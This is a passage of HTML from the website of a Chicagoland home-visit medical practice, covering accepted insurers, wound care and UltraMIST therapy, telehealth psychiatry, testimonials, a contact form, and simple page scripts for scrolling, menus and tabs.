                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>UNITED HEALTHCARE</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>AETNA MEDICARE</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>AETNA COMMERCIAL</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>HUMANA</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>CIGNA COMMERCIAL</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>BLUE CROSS AND BLUE SHIELD OF IL (BCBS IL)</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>BLUE CROSS MEDICARE ADVANTAGE</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>BLUE CROSS COMMUNITY</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>COUNTYCARE</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>AETNA BETTER HEALTH OF IL</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>AETNA BETTER HEALTH MMAI</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>MERIDIAN HEALTH PLAN OF IL</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>CENTENE</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>AMBETTER</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>WELLCARE</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>MOLINA HEALTHCARE OF IL</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Services Section -->
    <section id="services" class="py-24 bg-white">
        <div class="container mx-auto px-6">
            <div class="text-center mb-16 fade-in">
                <span class="inline-block bg-teal-50 text-vmp-teal text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider border border-teal-200 mb-4">What We Offer</span>
                <h2 class="text-4xl font-extrabold text-vmp-charcoal">Our Services</h2>
                <div class="section-divider w-16 mx-auto mt-4"></div>
            </div>
            <div class="grid md:grid-cols-2 gap-12 items-center">
                <div>
                    <img src="images/chronic.webp" alt="A close-up of a bandaged hand, representing wound care" class="rounded-full shadow-xl w-full max-w-md mx-auto">
                </div>
                <div>
                    <h3 class="text-2xl font-bold text-vmp-charcoal mb-6">Chronic Wound Services</h3>
                    <ul class="space-y-4">
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Wound Assessment & Diagnosis</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Advanced Wound Dressings & Therapies</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Infection Control & Management</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Specialized Wound Care Treatments</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Chronic Wound Types Managed</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Vascular & Circulatory Support</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Pain & Symptom Management</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Patient & Caregiver Education</span>
                        </li>
                        <li class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Home-Based & Outpatient Wound Care</span>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </section>

    <!-- UltraMIST Therapy Section -->
    <section class="py-24 bg-vmp-light-bg">
        <div class="container mx-auto px-6">
            <div class="grid md:grid-cols-2 gap-12 items-center">
                <div>
                    <h2 class="text-base font-semibold text-yellow-500 tracking-wide uppercase">Advanced Technology</h2>
                    <h3 class="text-3xl font-bold text-vmp-charcoal my-2">UltraMIST Therapy</h3>
                    <p class="text-gray-600 mb-4">
                        Visiting Medical Physicians is excited to provide Ultramist Therapy for patients suffering from challenging wounds, lesions, and ulcers.
                    </p>
                    <p class="text-gray-600">
                        The UltraMIST System's acoustic wave therapy promotes healing by controlling inflammation and reducing bacteria in the wound bed while increasing angiogenesis. Further promoting healing, it increases perfusion through vasodilation, ultimately increasing oxygen and nutrients to the tissue.
                    </p>
                    <div class="mt-6 space-y-3">
                        <div class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Controls inflammation in the wound bed</span>
                        </div>
                        <div class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Reduces bacteria &amp; promotes angiogenesis</span>
                        </div>
                        <div class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Increases perfusion through vasodilation</span>
                        </div>
                        <div class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Delivers increased oxygen &amp; nutrients to tissue</span>
                        </div>
                    </div>
                </div>
                <div>
                    <img src="images/ultramist-therapy.jpg" alt="UltraMIST acoustic wave therapy for wound healing" class="rounded-lg shadow-xl w-full">
                </div>
            </div>
        </div>
    </section>

    <!-- Psychological Consultation Section -->
    <section class="py-24 bg-white">
        <div class="container mx-auto px-6">
            <div class="grid md:grid-cols-2 gap-12 items-center">
                <div>
                    <img src="images/telehealth-psych.svg" alt="Telehealth psychological consultation" class="rounded-lg shadow-xl w-full">
                </div>
                <div>
                    <h2 class="text-base font-semibold text-yellow-500 tracking-wide uppercase">Mental Health Services</h2>
                    <h3 class="text-3xl font-bold text-vmp-charcoal my-2">&#129504; Psychological Consultation via Telehealth</h3>
                    <p class="text-gray-600 mb-6">Connect with our psychiatrists virtually to:</p>
                    <div class="space-y-3">
                        <div class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Evaluate your mental health</span>
                        </div>
                        <div class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Review medications and treatment</span>
                        </div>
                        <div class="flex items-start">
                            <svg class="w-6 h-6 text-vmp-lime mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            <span class="text-gray-600">Receive personalized support and guidance</span>
                        </div>
                    </div>
                    <p class="mt-6 text-vmp-teal font-semibold italic">Confidential, convenient, and compassionate care from home.</p>
                    <a href="#contact" class="mt-6 inline-block bg-vmp-teal text-white font-bold py-3 px-8 rounded-full hover:bg-opacity-90 transition duration-300 shadow-md">
                        Schedule a Consultation
                    </a>
                </div>
            </div>
        </div>
    </section>

    <!-- Testimonials Section -->
    <section id="testimonials" class="py-24 bg-vmp-light-bg">
        <div class="container mx-auto px-6">
            <div class="text-center mb-16 fade-in">
                <span class="inline-block bg-yellow-50 text-yellow-600 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider border border-yellow-200 mb-4">Patient Stories</span>
                <h2 class="text-4xl font-extrabold text-vmp-charcoal">What Our Patients Say</h2>
                <div class="section-divider w-16 mx-auto mt-4"></div>
            </div>
            <div class="grid md:grid-cols-2 gap-8">
                <!-- Testimonial Card 1 -->
                <div class="testimonial-card bg-white p-8 rounded-2xl shadow-md border border-gray-100 fade-in">
                    <div class="flex text-yellow-400 mb-4 text-xl">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
                    <svg class="w-8 h-8 text-teal-100 mb-3" fill="currentColor" viewBox="0 0 24 24"><path d="M14.017 21v-7.391c0-5.704 3.731-9.57 8.983-10.609l.995 2.151c-2.432.917-3.995 3.638-3.995 5.849h4v10h-9.983zm-14.017 0v-7.391c0-5.704 3.748-9.57 9-10.609l.996 2.151c-2.433.917-3.996 3.638-3.996 5.849h3.983v10h-9.983z"/></svg>
                    <p class="text-gray-600 italic mb-6 leading-relaxed">"The care and attention I received from Visiting Medical Physicians was outstanding. They are not just doctors; they are partners in my health. Having them come to my home has been a true blessing."</p>
                    <div class="flex items-center">
                        <div class="w-10 h-10 bg-vmp-teal rounded-full flex items-center justify-center text-white font-bold mr-3">M</div>
                        <div>
                            <p class="font-bold text-vmp-charcoal">Mary S.</p>
                            <p class="text-sm text-gray-400">Patient</p>
                        </div>
                    </div>
                </div>
                <!-- Testimonial Card 2 -->
                <div class="testimonial-card bg-white p-8 rounded-2xl shadow-md border border-gray-100 fade-in">
                    <div class="flex text-yellow-400 mb-4 text-xl">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
                    <svg class="w-8 h-8 text-teal-100 mb-3" fill="currentColor" viewBox="0 0 24 24"><path d="M14.017 21v-7.391c0-5.704 3.731-9.57 8.983-10.609l.995 2.151c-2.432.917-3.995 3.638-3.995 5.849h4v10h-9.983zm-14.017 0v-7.391c0-5.704 3.748-9.57 9-10.609l.996 2.151c-2.433.917-3.996 3.638-3.996 5.849h3.983v10h-9.983z"/></svg>
                    <p class="text-gray-600 italic mb-6 leading-relaxed">"I can't thank the team enough. They are professional, punctual, and incredibly compassionate. It's a relief to know my father is in such good hands without the stress of traveling to a clinic."</p>
                    <div class="flex items-center">
                        <div class="w-10 h-10 bg-vmp-deep-teal rounded-full flex items-center justify-center text-white font-bold mr-3">J</div>
                        <div>
                            <p class="font-bold text-vmp-charcoal">John D.</p>
                            <p class="text-sm text-gray-400">Family Member</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Contact Section -->
    <section id="contact" class="py-20 bg-vmp-light-bg">
        <div class="container mx-auto px-6">
            <div class="text-center mb-12">
                <h2 class="text-3xl font-bold text-vmp-charcoal">Get In Touch</h2>
                <p class="text-gray-600 mt-2">We're here to help. Reach out to schedule a visit or learn more.</p>
            </div>
            <div class="grid lg:grid-cols-2 gap-12">
                <!-- Contact Info & Map -->
                <div>
                    <div class="bg-white p-8 rounded-lg shadow-md mb-8">
                        <h3 class="text-xl font-semibold text-vmp-charcoal mb-4">Contact Information</h3>
                        <div class="space-y-4">
                            <p class="flex items-center"><svg class="w-6 h-6 text-vmp-teal mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg> 1340 Remington RD, Suite M, Schaumburg, IL 60173</p>
                            <p class="flex items-center"><svg class="w-6 h-6 text-vmp-teal mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg> 847.252.1858</p>
                            <p class="flex items-center"><svg class="w-6 h-6 text-vmp-teal mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg> care@visitingmedicalphysician.com</p>
                        </div>
                    </div>
                    <div class="rounded-lg shadow-md overflow-hidden">
                        <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2965.111104863925!2d-88.0435866845552!3d42.0195069792116!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x880fb11a4a5a1e2d%3A0x6a0f44f54248433!2s1340%20Remington%20Rd%20Suite%20M%2C%20Schaumburg%2C%20IL%2060173%2C%20USA!5e0!3m2!1sen!2sph!4v1662524345678!5m2!1sen!2sph" width="100%" height="350" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
                    </div>
                </div>
                <!-- Contact Form -->
                <div class="bg-white p-8 rounded-lg shadow-md">
                    <h3 class="text-xl font-semibold text-vmp-charcoal mb-4">Send Us a Message</h3>
                    <!-- The form is now configured to use the new PHP script -->
                    <form action="send_email.php" method="POST">
                        <div class="mb-4">
                            <label for="name" class="block text-gray-700 font-medium mb-2">Full Name</label>
                            <input type="text" id="name" name="name" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-vmp-teal focus:border-vmp-teal" required>
                        </div>
                        <div class="mb-4">
                            <label for="email" class="block text-gray-700 font-medium mb-2">Email Address</label>
                            <input type="email" id="email" name="email" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-vmp-teal focus:border-vmp-teal" required>
                        </div>
                        <div class="mb-4">
                            <label for="phone" class="block text-gray-700 font-medium mb-2">Phone Number</label>
                            <input type="tel" id="phone" name="phone" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-vmp-teal focus:border-vmp-teal">
                        </div>
                        <div class="mb-4">
                            <label for="message" class="block text-gray-700 font-medium mb-2">Message</label>
                            <textarea id="message" name="message" rows="5" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-vmp-teal focus:border-vmp-teal" required></textarea>
                        </div>
                        <div>
                            <button type="submit" class="w-full bg-vmp-lime text-white font-bold py-3 px-6 rounded-lg hover:bg-opacity-90 transition duration-300">
                                Submit Inquiry
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>
</main>

<!-- Scroll to Top Button -->
<button id="scroll-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" class="fixed bottom-8 right-8 z-50 bg-vmp-teal text-white w-12 h-12 rounded-full shadow-lg flex items-center justify-center hover:bg-vmp-deep-teal transition duration-300">
    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 15l7-7 7 7"></path></svg>
</button>

<!-- Footer -->
<footer class="bg-vmp-deep-teal text-white">
    <div class="container mx-auto px-6 py-12">
        <div class="grid md:grid-cols-3 gap-8 mb-8">
            <!-- Brand -->
            <div>
                <div class="flex items-center space-x-3 mb-4">
                    <div class="p-1.5 bg-white/20 rounded-full">
                        <img src="images/vmp.png" width="40" height="40" alt="VMP Logo">
                    </div>
                    <div>
                        <p class="font-extrabold text-white">Visiting Medical Physicians</p>
                        <p class="text-teal-300 text-sm">Compassionate Care at Home</p>
                    </div>
                </div>
                <p class="text-teal-200 text-sm leading-relaxed">Bringing expert, personalized healthcare directly to you across the Chicagoland area.</p>
            </div>
            <!-- Quick Links -->
            <div>
                <h4 class="font-bold text-white mb-4 uppercase tracking-wide text-sm">Quick Links</h4>
                <ul class="space-y-2">
                    <li><a href="#home" class="text-teal-200 hover:text-white transition text-sm">Home</a></li>
                    <li><a href="#mission" class="text-teal-200 hover:text-white transition text-sm">Our Mission</a></li>
                    <li><a href="#services" class="text-teal-200 hover:text-white transition text-sm">Services</a></li>
                    <li><a href="#contact" class="text-teal-200 hover:text-white transition text-sm">Contact Us</a></li>
                </ul>
            </div>
            <!-- Contact -->
            <div>
                <h4 class="font-bold text-white mb-4 uppercase tracking-wide text-sm">Contact</h4>
                <ul class="space-y-2 text-teal-200 text-sm">
                    <li>&#128205; 1340 Remington RD, Suite M<br>&nbsp;&nbsp;&nbsp;&nbsp; Schaumburg, IL 60173</li>
                    <li>&#128222; 847.252.1858</li>
                    <li>&#9993; care@visitingmedicalphysician.com</li>
                </ul>
            </div>
        </div>
        <div class="border-t border-white/20 pt-6 flex flex-col md:flex-row justify-between items-center">
            <p class="text-teal-300 text-sm">&copy; 2026 Visiting Medical Physicians Inc. All Rights Reserved.</p>
            <p class="text-teal-400 text-xs mt-2 md:mt-0">Serving the Chicagoland Area with Compassion</p>
        </div>
    </div>
</footer>

<script>
    // Scroll to top button
    const scrollTopBtn = document.getElementById('scroll-top');
    window.addEventListener('scroll', () => {
        if (window.scrollY > 400) scrollTopBtn.classList.add('show');
        else scrollTopBtn.classList.remove('show');
    });

    // Fade-in on scroll
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
    }, { threshold: 0.15 });
    document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));

    // Header shadow on scroll
    window.addEventListener('scroll', () => {
        document.getElementById('header').classList.toggle('header-shadow', window.scrollY > 10);
    });

    // Mobile menu toggle
    const mobileMenuButton = document.getElementById('mobile-menu-button');
    const mobileMenu = document.getElementById('mobile-menu');

    mobileMenuButton.addEventListener('click', () => {
        mobileMenu.classList.toggle('hidden');
    });

    // Close mobile menu when a link is clicked
    const mobileMenuLinks = mobileMenu.querySelectorAll('a');
    mobileMenuLinks.forEach(link => {
        link.addEventListener('click', () => {
            mobileMenu.classList.add('hidden');
        });
    });

    // Add shadow to header on scroll
    const header = document.getElementById('header');
    window.addEventListener('scroll', () => {
        if (window.scrollY > 10) {
            header.classList.add('header-shadow');
        } else {
            header.classList.remove('header-shadow');
        }
    });

    // JavaScript for tab functionality
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabContents = document.querySelectorAll('.tab-content');

    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            // Deactivate all buttons and hide all content
            tabButtons.forEach(btn => {
                btn.classList.remove('active');
                btn.classList.add('bg-vmp-light-bg', 'hover:bg-gray-200');
            });
            tabContents.forEach(content => {
                content.classList.add('hidden');
            });

            // Activate the clicked button and show its content
            button.classList.add('active');
            button.classList.remove('bg-vmp-light-bg', 'hover:bg-gray-200');
            const tabId = button.getAttribute('data-tab');
            document.getElementById(tabId).classList.remove('hidden');
        });
    });
</script>

</body>
</html>
